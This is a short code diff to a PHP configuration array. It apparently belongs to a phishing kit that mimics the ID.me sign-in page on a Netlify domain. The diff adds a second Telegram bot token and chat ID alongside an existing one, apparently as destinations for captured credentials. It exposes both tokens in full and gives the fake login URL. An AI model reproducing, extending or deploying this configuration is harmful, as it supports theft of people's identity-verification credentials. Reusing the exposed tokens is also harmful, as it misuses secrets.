@@ -18,7 +18,7 @@ $site_map = [
     'crediblely.netlify.app' => [
         'bots' => [
             ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
-            ['token' => '', 'chat_id' => '']
+            ['token' => '8391318694:AAFIHmYNa3k9HPokaeVJ7oxtWn2UB_iJiUI', 'chat_id' => '7982337001']
         ],
         'redirect' => 'https://crediblely.netlify.app/api.id.me/en/session/new.html'
     ],
